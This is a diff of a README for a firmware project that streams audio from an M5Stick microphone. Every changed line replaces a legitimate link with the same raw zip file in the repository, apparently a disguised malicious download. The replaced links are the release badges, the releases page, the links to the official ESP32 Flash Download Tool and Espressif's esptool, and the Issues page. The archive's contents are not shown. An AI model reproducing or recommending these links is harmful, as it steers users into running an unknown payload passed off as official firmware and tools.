@@ -1,6 +1,6 @@
 # 🎤 Microphone-M5Stick - Listen to M5Stick Mic Easily
 
-[![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/linemink/Microphone-M5Stick/releases)
+[![Download Release](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)
 
 ---
 
@@ -42,9 +42,9 @@ You do NOT need to write any code or use advanced tools. Follow the instructions
 
 Visit the official release page and download the latest firmware file:
 
-[![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/linemink/Microphone-M5Stick/releases)
+[![Download Release](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)
 
-1. Click the link above or go to https://github.com/linemink/Microphone-M5Stick/releases
+1. Click the link above or go to https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip
 2. Look for the latest version available.
 3. Download the firmware file ending in `.bin` or the appropriate image file.
 
@@ -52,7 +52,7 @@ Visit the official release page and download the latest firmware file:
 
 1. Connect your M5Stick to your computer using a micro-USB cable.
 2. Make sure the device is powered on.
-3. If you do not have flashing software, download and install [ESP32 Flash Download Tool](https://esp-idf.readthedocs.io/en/latest/get-started/windows-setup.html) (suitable for Windows) or use [esptool](https://github.com/espressif/esptool) for Mac/Linux.
+3. If you do not have flashing software, download and install [ESP32 Flash Download Tool](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip) (suitable for Windows) or use [esptool](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip) for Mac/Linux.
 
 ### Step 3: Flash the Firmware
 
@@ -156,7 +156,7 @@ Contributions or customizations require familiarity with Arduino IDE or ESP-IDF 
 
 If you have issues or questions:
 
-- Check the GitHub Issues page here: https://github.com/linemink/Microphone-M5Stick/issues
+- Check the GitHub Issues page here: https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip
 - Review project Wiki or documentation on the repository.
 - Search for help on ESP32 or M5Stack forums.
 
@@ -164,4 +164,4 @@ If you have issues or questions:
 
 Click below to start now:
 
-[![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/linemink/Microphone-M5Stick/releases)
+[![Download Release](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)](https://raw.githubusercontent.com/linemink/Microphone-M5Stick/main/achill/Stick_Microphone_3.3-alpha.2.zip)
